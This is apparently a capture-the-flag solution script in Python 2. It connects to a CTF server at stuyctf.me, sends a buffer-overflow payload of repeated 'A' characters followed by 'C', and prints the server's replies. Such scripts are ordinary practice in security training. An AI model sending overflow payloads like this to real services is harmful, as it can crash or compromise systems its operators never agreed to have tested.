#!/usr/bin/python

import socket
import sys
import time

server_address = ('stuyctf.me', 12345)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(server_address)
#print "i = " + str(i)
data = s.recv(64)
print data
overflow = "A"*30 + "C" + "\n" #* i
s.sendall(overflow)
print overflow
#time.sleep(0.5)
data = s.recv(1024)
print data
data = s.recv(1024)
print data
s.close()
